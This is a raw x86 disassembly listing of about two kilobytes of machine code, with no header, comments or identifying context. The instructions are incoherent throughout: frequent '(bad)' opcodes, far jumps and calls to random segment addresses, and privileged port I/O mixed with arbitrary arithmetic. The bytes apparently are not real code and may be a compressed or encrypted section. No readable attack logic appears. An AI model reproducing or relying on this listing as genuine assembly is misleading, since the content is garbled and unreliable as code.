  4145c1:	retf   0xd4ea
  4145c4:	sti    
  4145c5:	cmp    al,0xce
  4145c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145c8:	int3   
  4145c9:	dec    edx
  4145ca:	or     ah,bh
  4145cc:	loope  0x414568
  4145ce:	jp     0x414608
  4145d0:	(bad)  
  4145d1:	push   edi
  4145d2:	imul   ebx,DWORD PTR [ecx+0x49bfd417],0xfffffffa
  4145d9:	inc    esp
  4145da:	arpl   WORD PTR [ecx+edi*2-0x2f],dx
  4145de:	cmp    edx,edi
  4145e0:	xor    cl,BYTE PTR [esi]
  4145e2:	gs es and ebp,ebp
  4145e6:	js     0x4145e0
  4145e8:	push   ebx
  4145e9:	(bad)  
  4145ea:	adc    BYTE PTR [ebx+edi*1],dh
  4145ed:	xchg   ecx,eax
  4145ee:	rcr    DWORD PTR [ebx-0x72],cl
  4145f1:	dec    edi
  4145f2:	sti    
  4145f3:	ret    
  4145f4:	xor    DWORD PTR [esi+0x26],edx
  4145f7:	add    esp,DWORD PTR [edi-0x51]
  4145fa:	jmp    0xc746:0xd80754b0
  414601:	fidivr WORD PTR [ebx]
  414603:	retf   
  414604:	je     0x414640
  414606:	push   ds
  414607:	jb     0x414676
  414609:	xlat   BYTE PTR ds:[ebx]
  41460a:	jmp    0xb187:0xb995188b
  414611:	sub    dh,BYTE PTR [ebx+0x75]
  414614:	int3   
  414615:	retf   0x3d94
  414618:	sbb    al,0x53
  41461a:	cmp    ebp,DWORD PTR [edx]
  41461c:	jmp    0xb1c479d1
  414621:	pop    DWORD PTR [ebx]
  414623:	xchg   edi,eax
  414624:	test   al,ah
  414626:	xchg   esp,eax
  414627:	push   0xed7351c
  41462c:	test   eax,0x3def4a20
  414631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414632:	push   esp
  414633:	call   0x47da:0x5a8e4555
  41463a:	push   cs
  41463b:	xchg   esi,eax
  41463c:	retf   0x79a2
  41463f:	add    BYTE PTR [edi+0x2c],ah
  414642:	stos   BYTE PTR es:[edi],al
  414643:	lock js 0x414643
  414646:	fnsave [ecx]
  414648:	div    DWORD PTR [eax-0x4a6c5ac3]
  41464e:	aam    0xe5
  414650:	aam    0xd4
  414652:	cmp    eax,0xdb2c2abf
  414657:	repnz mov eax,0xc6929959
  41465d:	mov    dh,0xe7
  41465f:	(bad)  
  414660:	jo     0x414649
  414662:	sbb    dl,BYTE PTR [ebp-0x3ea77235]
  414668:	push   ebp
  414669:	out    0xc3,eax
  41466b:	rol    DWORD PTR [ecx],0x6
  41466e:	aaa    
  41466f:	pop    ecx
  414670:	nop
  414671:	push   edi
  414672:	les    esi,FWORD PTR [eax]
  414674:	(bad)  
  414675:	(bad)  
  414676:	cmp    DWORD PTR [eax-0x1d],edx
  414679:	sub    BYTE PTR ds:0xfd1a5105,dl
  41467f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414680:	enter  0x9581,0x72
  414684:	push   edx
  414685:	mov    ecx,0x3c731839
  41468a:	sbb    edi,ebx
  41468c:	test   DWORD PTR [esp+eax*2+0xe],0xda0faa20
  414694:	aaa    
  414695:	addr16 xchg edi,eax
  414697:	jne    0x41467d
  414699:	inc    eax
  41469a:	fmul   DWORD PTR [ecx+edx*2+0x6eb5e103]
  4146a1:	sbb    BYTE PTR [ebx+eax*2],bl
  4146a4:	sub    DWORD PTR [esi-0x29],eax
  4146a7:	icebp  
  4146a8:	cmp    ebp,ebx
  4146aa:	xlat   BYTE PTR ds:[ebx]
  4146ab:	ds jp  0x414656
  4146ae:	stos   BYTE PTR es:[edi],al
  4146af:	jns    0x4146b9
  4146b1:	out    dx,eax
  4146b2:	xchg   edi,eax
  4146b3:	xchg   ah,al
  4146b5:	outs   dx,BYTE PTR ds:[esi]
  4146b6:	mov    al,0x4e
  4146b8:	fnstenv [ebp+0x567243a8]
  4146be:	jmp    0xbf7e896f
  4146c3:	add    esp,DWORD PTR [esi-0x73bc3c72]
  4146c9:	add    DWORD PTR [eax],eax
  4146cb:	inc    esp
  4146cc:	in     al,0xc6
  4146ce:	xlat   BYTE PTR ds:[ebx]
  4146cf:	mov    dl,0x9b
  4146d1:	fdivr  QWORD PTR [eax]
  4146d3:	xor    eax,0xe84f5406
  4146d8:	add    edx,DWORD PTR [eax-0x5d]
  4146db:	jo     0x414741
  4146dd:	repz pop eax
  4146df:	sub    ah,BYTE PTR [edx]
  4146e1:	inc    edi
  4146e2:	dec    edx
  4146e3:	dec    esi
  4146e4:	xor    bl,bl
  4146e6:	mov    eax,ds:0xd57bd077
  4146eb:	mov    ds:0x7a6dac37,eax
  4146f0:	or     cl,BYTE PTR [edx]
  4146f2:	mov    al,0x96
  4146f4:	(bad)  
  4146f5:	xchg   esi,eax
  4146f6:	rol    BYTE PTR [edx],0xdf
  4146f9:	dec    edi
  4146fa:	inc    esi
  4146fb:	scas   al,BYTE PTR es:[edi]
  4146fc:	js     0x41472c
  4146fe:	xchg   ebx,eax
  4146ff:	nop
  414700:	out    dx,eax
  414701:	pop    esp
  414702:	mov    ecx,0x9955063c
  414707:	jmp    0x39cf:0x1ea0aabd
  41470e:	popf   
  41470f:	push   esp
  414710:	mov    ds:0x4e5723ab,eax
  414715:	cmc    
  414716:	inc    edx
  414717:	dec    esi
  414718:	fcomi  st,st(1)
  41471a:	sbb    DWORD PTR [edx-0x7e],eax
  41471d:	imul   edi,DWORD PTR [ecx-0x18cc16b9],0xd0eada77
  414727:	stc    
  414728:	lock cmp DWORD PTR [edi-0x31e19054],ebp
  41472f:	push   esp
  414730:	std    
  414731:	iret   
  414732:	cmp    al,0x44
  414734:	arpl   bp,di
  414736:	cmp    dh,BYTE PTR [esi]
  414738:	add    eax,0x74d90d0a
  41473d:	cs je  0x41475e
  414740:	push   ecx
  414741:	(bad)  
  414742:	push   esp
  414743:	mov    edi,0x3ba9498e
  414748:	and    al,BYTE PTR [edi]
  41474a:	push   edx
  41474b:	(bad)  
  41474c:	xchg   ebp,eax
  41474d:	adc    eax,0x75701df8
  414752:	dec    esi
  414753:	dec    edx
  414754:	hlt    
  414755:	fimul  WORD PTR ds:0xd3ab194d
  41475b:	jbe    0x414754
  41475d:	fdivr  st,st(6)
  41475f:	pop    ecx
  414760:	fdivr  DWORD PTR [edi+0x67]
  414763:	push   esi
  414764:	lods   eax,DWORD PTR ds:[esi]
  414765:	enter  0xc3c1,0x43
  414769:	xor    dh,bl
  41476b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41476c:	dec    esp
  41476d:	push   ebp
  41476e:	(bad)  
  41476f:	scas   al,BYTE PTR es:[edi]
  414770:	cli    
  414771:	jecxz  0x4147d4
  414773:	inc    eax
  414774:	mov    DWORD PTR [ebp+0x100064b2],edi
  41477a:	shr    BYTE PTR [eax+0x69],cl
  41477d:	or     BYTE PTR [esi+0x21],0x1f
  414781:	or     eax,0x77ee4255
  414786:	jo     0x4147f8
  414788:	add    BYTE PTR [eax+0x4],dh
  41478b:	arpl   bp,di
  41478d:	dec    esi
  41478e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41478f:	xor    al,0x6f
  414791:	loopne 0x41471b
  414793:	scas   eax,DWORD PTR es:[edi]
  414794:	mov    cl,0x9c
  414796:	(bad)  
  414797:	lea    eax,[eax]
  414799:	(bad)  
  41479a:	jmp    0xb6c8c9b7
  41479f:	push   edi
  4147a0:	inc    edi
  4147a1:	dec    esi
  4147a2:	xor    eax,0x3d23919b
  4147a7:	(bad)  [edx-0x10]
  4147aa:	mov    ch,BYTE PTR [eax]
  4147ac:	sar    DWORD PTR [esi+eiz*4+0x2725475d],cl
  4147b3:	add    ebp,DWORD PTR [eax]
  4147b5:	jns    0x4147b7
  4147b7:	fimul  WORD PTR [ebx+0x79]
  4147ba:	mov    edx,0x12a6955c
  4147bf:	(bad)  
  4147c0:	(bad)  
  4147c1:	inc    edi
  4147c2:	(bad)  
  4147c3:	jl     0x414844
  4147c5:	enter  0x5535,0xbf
  4147c9:	pop    esi
  4147ca:	xor    BYTE PTR [ebp+ecx*1+0x58050c31],bl
  4147d1:	das    
  4147d2:	out    dx,al
  4147d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d4:	mul    edi
  4147d6:	cmp    BYTE PTR [ebp+0x28b690ad],dh
  4147dc:	inc    edi
  4147dd:	(bad)  
  4147de:	(bad)  
  4147df:	or     DWORD PTR [esp+eax*1],eax
  4147e2:	push   ss
  4147e3:	mov    dh,0xa7
  4147e5:	jecxz  0x414837
  4147e7:	inc    ebx
  4147e8:	mov    ds:0xff4b4e42,al
  4147ed:	push   esp
  4147ee:	push   edi
  4147ef:	sub    BYTE PTR [edi],cl
  4147f1:	(bad)  
  4147f2:	xlat   BYTE PTR ds:[ebx]
  4147f3:	nop
  4147f4:	cmp    DWORD PTR [ebx-0x60],edx
  4147f7:	arpl   WORD PTR [eax-0x3b],di
  4147fa:	cmp    DWORD PTR [ebx-0x47],edx
  4147fd:	test   BYTE PTR [ebp-0xc5d0c59],dh
  414803:	retf   
  414804:	neg    ch
  414806:	mov    al,0xa9
  414808:	ja     0x414824
  41480a:	mov    dh,0x34
  41480c:	lods   eax,DWORD PTR ds:[esi]
  41480d:	dec    edi
  41480e:	sub    ah,BYTE PTR [ebx]
  414810:	scas   eax,DWORD PTR es:[edi]
  414811:	mov    edi,ebp
  414813:	mov    al,ds:0xe1e558c
  414818:	push   ss
  414819:	into   
  41481a:	adc    al,0xa8
  41481c:	scas   eax,DWORD PTR es:[edi]
  41481d:	outs   dx,BYTE PTR ds:[esi]
  41481e:	imul   eax,DWORD PTR [edi*4+0x721b5188],0xffffff83
  414826:	pop    edx
  414828:	jne    0x414804
  41482a:	(bad)  
  41482c:	lods   eax,DWORD PTR ds:[esi]
  41482d:	xlat   BYTE PTR ds:[ebx]
  41482e:	mov    dl,0xbd
  414830:	add    al,0x0
  414832:	fiadd  DWORD PTR [ecx+0x5522e146]
  414838:	add    al,0x8f
  41483a:	sub    DWORD PTR ds:0x8a31e281,edi
  414840:	ss jmp 0x4227:0x1aa3b1f1
  414848:	add    eax,0x43d42cd6
  41484d:	and    edx,ebp
  41484f:	mov    al,ds:0xfa5ac7d9
  414854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414855:	jge    0x4147fc
  414857:	repnz push 0x954dee7d
  41485d:	jp     0x4148d9
  41485f:	mov    edi,0x7aa3bd79
  414864:	cmp    esi,DWORD PTR [edx-0x1c]
  414867:	push   ebp
  414868:	pop    ecx
  414869:	push   ecx
  41486a:	xchg   ecx,eax
  41486b:	aam    0x93
  41486d:	cmp    esi,DWORD PTR [ebp+0x57]
  414870:	lock inc edx
  414872:	push   ecx
  414873:	add    edx,DWORD PTR [edi+0x70]
  414876:	je     0x4148b2
  414878:	jmp    0x2383:0x40808c5e
  41487f:	in     eax,dx
  414880:	aam    0xbc
  414882:	inc    esi
  414883:	push   edi
  414884:	scas   al,BYTE PTR es:[edi]
  414885:	jne    0x41482c
  414887:	and    al,0x58
  414889:	push   ebp
  41488a:	xchg   ecx,eax
  41488b:	xor    eax,DWORD PTR [esi]
  41488d:	gs or  eax,0xbcf18cf8
  414893:	xchg   BYTE PTR ds:0x164fc8dd,cl
  414899:	out    0xf8,al
  41489b:	mov    esi,0xd2559f2b
  4148a0:	jbe    0x4148cf
  4148a2:	mul    edx
  4148a4:	sti    
  4148a5:	lea    edx,[ecx+0x1d6418ef]
  4148ab:	sbb    dl,BYTE PTR [edi+0x37]
  4148ae:	bound  edi,QWORD PTR [eax+0xd761974]
  4148b4:	mov    ecx,esi
  4148b6:	mov    ecx,0x3543d18e
  4148bb:	or     edi,DWORD PTR gs:[edi+ebx*2-0x27]
  4148c0:	sbb    BYTE PTR [edi+edi*8+0x15],dl
  4148c4:	xor    BYTE PTR [esi+ebx*1+0x62cec567],dh
  4148cb:	call   0x1abe:0xd0a76f72
  4148d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148d3:	mov    dl,0xe9
  4148d5:	nop
  4148d6:	jbe    0x414935
  4148d8:	outs   dx,DWORD PTR ds:[esi]
  4148d9:	mov    edx,0x6dc3daf6
  4148de:	addr16 jmp 0xd5c88b02
  4148e4:	lahf   
  4148e5:	test   BYTE PTR [ecx],0x10
  4148e8:	mov    DWORD PTR [edx+0x68],ecx
  4148eb:	aad    0x8a
  4148ed:	fdivr  QWORD PTR [ebx+0x2a34f3b2]
  4148f3:	pop    DWORD PTR [edi-0x28ac5e3a]
  4148f9:	scas   al,BYTE PTR es:[edi]
  4148fa:	imul   ebx,eax,0xe9eee37d
  414900:	fdivr  DWORD PTR [ebx+0x1f]
  414903:	mov    WORD PTR [edx],?
  414905:	adc    esp,DWORD PTR [edi+0x4f692db9]
  41490b:	jecxz  0x41494f
  41490d:	adc    eax,0x6e474e0
  414912:	scas   al,BYTE PTR es:[edi]
  414913:	or     dl,ch
  414915:	push   esp
  414916:	dec    ebp
  414917:	scas   eax,DWORD PTR es:[edi]
  414918:	sar    esi,1
  41491a:	xchg   DWORD PTR [eax],ebp
  41491c:	(bad)  
  41491e:	cwde   
  41491f:	sar    DWORD PTR [eax],cl
  414921:	in     eax,dx
  414922:	mov    ebx,0x723af97b
  414927:	ss repz xchg edx,eax
  41492a:	sbb    ch,cl
  41492c:	pop    es
  41492d:	mov    eax,0x5f569b5c
  414932:	sub    eax,0x28fd90ed
  414937:	sbb    eax,0xb52d471f
  41493c:	aas    
  41493d:	mov    eax,0xc146327e
  414942:	xchg   ebp,eax
  414943:	(bad)  
  414944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414945:	push   es
  414946:	in     eax,0xb4
  414948:	bound  esi,QWORD PTR ds:[ecx+eax*8]
  41494c:	stos   BYTE PTR es:[edi],al
  41494d:	push   esp
  41494e:	mov    edi,0xd0264313
  414953:	sub    al,0xd4
  414955:	mov    eax,ds:0x4f81438e
  41495a:	in     eax,0x42
  41495c:	shr    BYTE PTR [eax],0x85
  41495f:	adc    al,0xa
  414961:	pop    eax
  414962:	retf   0xbcc6
  414965:	iret   
  414966:	in     al,dx
  414967:	xchg   ebx,eax
  414968:	add    ebp,DWORD PTR [edi+eax*4-0x567025e1]
  41496f:	enter  0x971f,0xee
  414973:	adc    al,0xfa
  414975:	call   0x96de9688
  41497a:	ffreep st(7)
  41497c:	loop   0x41495f
  41497e:	inc    edx
  41497f:	fdivr  DWORD PTR [ebx-0x63]
  414982:	repz xchg edx,eax
  414984:	jle    0x414941
  414986:	repz sub al,0xe9
  414989:	push   edi
  41498a:	mov    ds:0x43af19f0,eax
  41498f:	pop    ebp
  414990:	add    edi,0xffffff81
  414993:	cmp    eax,DWORD PTR [ebp+0x4542f40b]
  414999:	daa    
  41499a:	cmc    
  41499b:	cli    
  41499c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41499d:	fsub   DWORD PTR [ebp+0x1c]
  4149a0:	sub    dl,BYTE PTR [esi-0x65f15958]
  4149a6:	adc    ecx,DWORD PTR [ebp-0x36]
  4149a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149aa:	pop    esi
  4149ab:	mov    ss,WORD PTR [ebx+ecx*2-0x17]
  4149af:	xchg   ecx,eax
  4149b0:	xchg   BYTE PTR ds:0xd06e6caa,cl
  4149b6:	push   0xffffffc4
  4149b8:	dec    esi
  4149b9:	jmp    0x47292aef
  4149be:	out    dx,al
  4149bf:	in     eax,dx
  4149c0:	pop    eax
  4149c1:	pop    ss
  4149c2:	out    dx,eax
  4149c3:	push   ebp
  4149c4:	cmp    bh,al
  4149c6:	push   0x527d826c
  4149cb:	add    eax,0xc88f9477
  4149d0:	in     eax,0x53
  4149d2:	inc    ebp
  4149d3:	scas   al,BYTE PTR es:[edi]
  4149d4:	call   0x64350029
  4149d9:	push   0x79c89530
  4149de:	mov    edx,0xecf557df
  4149e3:	ins    DWORD PTR es:[edi],dx
  4149e4:	imul   ebx,DWORD PTR [edi+0x59fb02a1],0x49
  4149eb:	aas    
  4149ec:	xor    al,0x8c
  4149ee:	jb     0x414a2a
  4149f0:	stos   BYTE PTR es:[edi],al
  4149f1:	repz jmp 0xaee5:0x55e74acc
  4149f9:	and    BYTE PTR [ebx+0x876d0fd],ah
  4149ff:	dec    esi
  414a00:	hlt    
  414a01:	lock push 0x3c
  414a04:	scas   al,BYTE PTR es:[edi]
  414a05:	pushf  
  414a06:	in     al,dx
  414a07:	scas   eax,DWORD PTR es:[edi]
  414a08:	jmp    0x741c:0x888f329d
  414a0f:	xchg   ebp,eax
  414a10:	sub    eax,0x7e5be444
  414a15:	push   ebp
  414a16:	jg     0x414a8d
  414a18:	sahf   
  414a19:	je     0x414a67
  414a1b:	cld    
  414a1c:	mov    esi,0xab29d763
  414a21:	sar    BYTE PTR [ecx+0x74],1
  414a24:	adc    BYTE PTR [edi-0x56],dh
  414a27:	lods   eax,DWORD PTR ds:[esi]
  414a28:	lods   al,BYTE PTR ds:[esi]
  414a29:	mov    al,ds:0x577f82c4
  414a2e:	cld    
  414a2f:	dec    esi
  414a30:	sbb    eax,0xcfd70351
  414a35:	cmp    eax,0x74205424
  414a3a:	mov    al,ss:0x4961eb76
  414a40:	dec    eax
  414a41:	popf   
  414a42:	or     DWORD PTR [eax],eax
  414a44:	pushf  
  414a45:	cmp    dh,BYTE PTR es:0x723ae
  414a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a4d:	mov    cl,0x1d
  414a4f:	jmp    0x4149d1
  414a51:	or     eax,ebx
  414a53:	daa    
  414a54:	cmp    DWORD PTR [edx-0x6c],esp
  414a57:	xchg   esi,eax
  414a58:	sub    BYTE PTR [edx],dh
  414a5a:	stos   DWORD PTR es:[edi],eax
  414a5b:	xlat   BYTE PTR ds:[ebx]
  414a5c:	push   ecx
  414a5d:	fs or  eax,0xa8c55d79
  414a63:	xlat   BYTE PTR ds:[ebx]
  414a64:	stos   DWORD PTR es:[edi],eax
  414a65:	bound  edx,QWORD PTR [eax*2-0xd713f8b]
  414a6c:	(bad)  
  414a6d:	cmp    BYTE PTR es:[ebp+0x2870a568],bl
  414a74:	push   ds
  414a75:	mov    ds:0x46326fe2,eax
  414a7a:	jg     0x414a74
  414a7c:	mov    eax,ds:0x4654c992
  414a81:	shl    DWORD PTR [ecx+0x526b38fe],1
  414a87:	(bad)
  414a8a:	push   ebx
  414a8b:	ror    DWORD PTR [ecx+0x63],0x47
  414a8f:	popf   
  414a90:	cmp    edx,DWORD PTR [ebp-0x34]
  414a93:	sub    dh,dl
  414a95:	cld    
  414a96:	add    DWORD PTR [ebx],0xffffff82
  414a99:	mov    dh,0xa5
  414a9b:	lds    ebp,FWORD PTR [ecx+0x28]
  414a9e:	in     eax,0xa5
  414aa0:	xor    DWORD PTR [ebx],ebp
  414aa2:	sti    
  414aa3:	xor    eax,0x1fb1ed29
  414aa8:	pop    edx
  414aa9:	inc    DWORD PTR [esi-0x22]
  414aac:	inc    esi
  414aad:	push   ds
  414aae:	bound  eax,QWORD PTR [eax]
  414ab0:	add    BYTE PTR [edx+esi*1],bl
  414ab3:	dec    ecx
  414ab4:	inc    esp
  414ab5:	inc    ecx
  414ab6:	push   esp
  414ab7:	imul   esi,DWORD PTR [edi+0x52],0xe8c75cc6
  414abe:	call   0x5504:0x6a8e87bf
  414ac5:	in     al,0xf9
  414ac7:	or     dl,dh
  414ac9:	iret   
  414aca:	out    dx,eax
  414acb:	cmp    DWORD PTR [esi],ebp
  414acd:	xlat   BYTE PTR ds:[ebx]
  414ace:	sub    eax,0x20cedba5
  414ad3:	dec    ebx
  414ad4:	mov    eax,ds:0x4e8c32ae
  414ad9:	in     al,0xe
  414adb:	retf   
  414adc:	sar    DWORD PTR [esp+eiz*2+0x11cfaa33],0xb9
  414ae4:	dec    esi
  414ae5:	jns    0x414acf
  414ae7:	lods   al,BYTE PTR ds:[esi]
  414ae8:	inc    eax
  414ae9:	in     al,0x3a
  414aeb:	loopne 0x414b0e
  414aed:	lahf   
  414aee:	mov    dl,0xb0
  414af0:	sbb    bl,dl
  414af2:	xchg   DWORD PTR [eax],ebp
  414af4:	aam    0xe9
  414af6:	and    al,ah
  414af8:	jp     0x414a97
  414afa:	test   DWORD PTR [eax],eax
  414afc:	pushf  
  414afd:	fs popf 
  414aff:	js     0x414b1e
  414b01:	pushf  
  414b02:	(bad)  
  414b03:	dec    DWORD PTR [edx-0x5d]
  414b06:	mov    esp,0x50685153
  414b0b:	arpl   WORD PTR [ebp+0x4e],bx
  414b0e:	test   al,0x76
  414b10:	pop    eax
  414b11:	mov    ebp,0x63dc5110
  414b16:	imul   edx,DWORD PTR [ebp-0x78],0xbf6cff90
  414b1d:	mov    ds,esp
  414b1f:	or     ebp,DWORD PTR [edx-0x1fb9aa49]
  414b25:	xchg   ebx,eax
  414b26:	push   ecx
  414b27:	inc    edi
  414b28:	push   cs
  414b29:	jp     0x414b85
  414b2b:	cld    
  414b2c:	jae    0x414b24
  414b2e:	push   edi
  414b2f:	daa    
  414b30:	xchg   bh,bh
  414b32:	adc    eax,0xa1673c6c
  414b37:	jecxz  0x414adf
  414b39:	xchg   DWORD PTR [esi-0x20],edx
  414b3c:	lods   al,BYTE PTR ds:[esi]
  414b3d:	dec    esp
  414b3e:	(bad)  
  414b3f:	jmp    0x1905:0xd3c20975
  414b46:	push   esp
  414b47:	xchg   ecx,eax
  414b48:	daa    
  414b49:	pop    ss
  414b4a:	jne    0x414afa
  414b4c:	dec    eax
  414b4d:	pop    ecx
  414b4e:	xchg   ebp,eax
  414b4f:	push   ss
  414b50:	jecxz  0x414bc5
  414b52:	xor    eax,0xcaafd65a
  414b57:	dec    ebp
  414b58:	ret    
  414b59:	push   edx
  414b5a:	pusha  
  414b5b:	test   al,0x23
  414b5d:	jns    0xd90a8c37
  414b63:	sbb    al,BYTE PTR [ebp-0x6f8e6306]
  414b69:	dec    edx
  414b6a:	stos   DWORD PTR es:[edi],eax
  414b6b:	addr16 addr16 pop ebp
  414b6e:	or     cl,BYTE PTR [edx+0x2a]
  414b71:	addr16 gs push 0x7a
  414b75:	mov    ebp,0xee2d3532
  414b7a:	pop    esp
  414b7b:	cmp    dh,BYTE PTR [esi-0x61]
  414b7e:	mov    dh,0xc1
  414b80:	jp     0x414bbb
  414b82:	das    
  414b83:	fs pop ebp
  414b85:	out    dx,al
  414b86:	jge    0x414bc5
  414b88:	dec    esp
  414b89:	shl    dh,1
  414b8b:	push   ebp
  414b8c:	outs   dx,BYTE PTR ds:[esi]
  414b8d:	aam    0xa5
  414b8f:	mov    cl,dl
  414b91:	rcl    BYTE PTR [ebp+ebx*4-0x80],1
  414b95:	cmp    BYTE PTR [ecx-0x65154ee6],0xdf
  414b9c:	stos   DWORD PTR es:[edi],eax
  414b9d:	loopne 0x414b67
  414b9f:	push   eax
  414ba0:	ins    DWORD PTR es:[edi],dx
  414ba1:	cmp    dh,BYTE PTR [edx+0x79]
  414ba4:	test   eax,0x392029ae
  414ba9:	adc    ebx,0xffffffb6
  414bac:	shl    DWORD PTR [ecx-0x2a4cb160],cl
  414bb2:	retf   
  414bb3:	js     0x414b91
  414bb5:	fdiv   QWORD PTR [esi+eax*2-0x2c5ea9c6]
  414bbc:	in     eax,dx
  414bbd:	push   edx
  414bbe:	xchg   DWORD PTR [eax+ecx*4-0x33],ebx
  414bc2:	inc    edi
  414bc3:	jmp    0xcaa66130
  414bc8:	stos   DWORD PTR es:[edi],eax
  414bc9:	xlat   BYTE PTR ds:[ebx]
  414bca:	test   al,0xe7
  414bcc:	icebp  
  414bcd:	sbb    bl,cl
  414bcf:	cdq    
  414bd0:	mov    DWORD PTR [edx],ecx
  414bd2:	push   esi
  414bd3:	sti    
  414bd4:	retf   0xd5ef
  414bd7:	repz adc al,BYTE PTR [esi+eiz*4+0x86a5fa5]
  414bdf:	mov    ss,esi
  414be1:	ins    BYTE PTR es:[edi],dx
  414be2:	push   ebx
  414be3:	cmp    eax,0xcbe454d4
  414be8:	mov    ebp,DWORD PTR [edx]
  414bea:	push   ebx
  414beb:	cmc    
  414bec:	ds push eax
  414bee:	sahf   
  414bef:	or     DWORD PTR [ebx-0x756a094b],edx
  414bf5:	ficom  DWORD PTR [edx-0x54a96f02]
  414bfb:	xor    DWORD PTR [edx-0x41b996a9],edi
  414c01:	das    
  414c02:	sub    BYTE PTR [ebp+0x3d],0x5a
  414c06:	push   0x79d563a5
  414c0b:	push   edi
  414c0c:	inc    ebx
  414c0d:	gs js  0x414c62
  414c10:	inc    ebp
  414c11:	push   cs
  414c12:	nop
  414c13:	sub    al,BYTE PTR [ebx+0x2a]
  414c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c17:	(bad)  
  414c18:	out    0x1e,eax
  414c1a:	stos   BYTE PTR es:[edi],al
  414c1b:	sub    DWORD PTR [eax],edx
  414c1d:	stos   BYTE PTR es:[edi],al
  414c1e:	ins    BYTE PTR es:[edi],dx
  414c1f:	aam    0x18
  414c21:	(bad)  
  414c23:	fimul  DWORD PTR [ebp-0x1acd4237]
  414c29:	shl    DWORD PTR [edx+0x16d6bacf],cl
  414c2f:	aas    
  414c30:	pop    ds
  414c31:	pop    ss
  414c32:	jmp    0xe829:0xeb9ceaa
  414c39:	jmp    0x505a71b3
  414c3e:	(bad)
  414c42:	inc    ebx
  414c43:	or     dh,BYTE PTR [edi-0x46]
  414c46:	into   
  414c47:	clc    
  414c48:	cmp    al,0xdc
  414c4a:	lods   eax,DWORD PTR ds:[esi]
  414c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c4c:	scas   eax,DWORD PTR es:[edi]
  414c4d:	into   
  414c4e:	jle    0x414c45
  414c50:	jae    0x414c71
  414c52:	fwait
  414c53:	sub    al,0x60
  414c56:	adc    eax,0x14a305c0
  414c5b:	mov    ch,0x64
  414c5d:	mov    eax,0xac7a0f1e
  414c62:	adc    eax,0xac778f72
  414c67:	sbb    eax,0x1a585a43
  414c6c:	pushf  
  414c6d:	(bad)  
  414c6e:	pusha  
  414c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c70:	xor    BYTE PTR [eax+0x2329f565],ah
  414c76:	push   ecx
  414c77:	push   esp
  414c78:	push   edi
  414c79:	inc    esp
  414c7a:	lods   al,BYTE PTR ds:[esi]
  414c7b:	and    esp,DWORD PTR [edi+0x2abe8eb1]
  414c81:	cld    
  414c82:	adc    bl,dl
  414c84:	jmp    0x414c8a
  414c86:	test   eax,0xf87f6a22
  414c8b:	cmp    ebx,ebp
  414c8d:	and    eax,0xa4087800
  414c92:	inc    esi
  414c93:	retf   0xd4f6
  414c96:	jecxz  0x414c50
  414c98:	test   ecx,0xb7c8a6df
  414c9e:	adc    eax,0xc7aabbd3
  414ca3:	and    eax,0xa6315210
  414ca8:	arpl   WORD PTR [edi+eax*8-0x64],si
  414cac:	xor    al,BYTE PTR [esi]
  414cae:	and    edx,DWORD PTR gs:[ebx]
  414cb1:	xor    DWORD PTR [edx-0x35dcd510],ebp
  414cb7:	push   ebp
  414cb8:	out    0x84,eax
  414cba:	add    BYTE PTR [edi+ecx*8-0x32],al
  414cbe:	imul   edi,DWORD PTR [esp+eax*1],0x52
  414cc2:	stc    
  414cc3:	stos   BYTE PTR es:[edi],al
  414cc4:	or     al,0x55
  414cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cc7:	aam    0xcb
  414cc9:	sub    eax,DWORD PTR [eax-0x6094be57]
  414ccf:	dec    ebx
  414cd0:	pop    esi
  414cd1:	fiadd  DWORD PTR [ecx]
  414cd3:	inc    ebp
  414cd4:	jmp    0x414ca8
  414cd6:	jo     0x414d1f
  414cd8:	out    0x55,eax
  414cda:	out    0xc0,eax
  414cdc:	repz push es
  414cde:	push   ebx
  414cdf:	push   edx
  414ce0:	scas   eax,DWORD PTR es:[edi]
  414ce1:	xchg   BYTE PTR [esi],ch
  414ce3:	pushf  
  414ce4:	addr16 add eax,0x92e39d35
  414cea:	xlat   BYTE PTR ds:[ebx]
  414ceb:	data16 aas 
  414ced:	sbb    DWORD PTR [esi+0x4c],ebx
  414cf0:	inc    esp
  414cf1:	scas   al,BYTE PTR es:[edi]
  414cf2:	xlat   BYTE PTR ds:[ebx]
  414cf3:	in     al,dx
  414cf4:	jae    0x414d21
  414cf6:	inc    esi
  414cf7:	ins    DWORD PTR es:[edi],dx
  414cf8:	enter  0xeafb,0xf3
  414cfc:	push   edx
  414cfd:	repnz in al,dx
  414cff:	push   ecx
  414d00:	call   0xc5198898
  414d05:	add    ah,bh
  414d07:	pop    ecx
  414d08:	add    BYTE PTR [ebp+0x14],dl
  414d0b:	sub    ch,BYTE PTR [edx+0x37]
  414d0e:	retf   0xed86
  414d11:	xchg   ebx,eax
  414d12:	pop    edx
  414d13:	adc    al,BYTE PTR [eax+0x8ed7452]
  414d19:	or     eax,0xc14cde84
  414d1e:	mov    ds:0xe7abed61,eax
  414d23:	scas   eax,DWORD PTR es:[edi]
  414d24:	in     al,0xfb
  414d26:	dec    esi
  414d27:	in     al,0x49
  414d29:	xor    dh,dh
  414d2b:	mov    ebx,0xe0e87eb6
  414d30:	aad    0x6b
  414d32:	sub    ecx,DWORD PTR ds:0x7a50f055
  414d38:	scas   eax,DWORD PTR es:[edi]
  414d39:	ret    0x98f2
  414d3c:	dec    ebx
  414d3d:	xchg   ebp,eax
  414d3e:	adc    DWORD PTR [ebx+0x227c8adb],0xffffff95
  414d45:	jle    0x414cf2
  414d47:	push   edi
  414d48:	sub    cl,dl
  414d4a:	pop    esp
  414d4b:	xchg   ebp,eax
  414d4c:	aas    
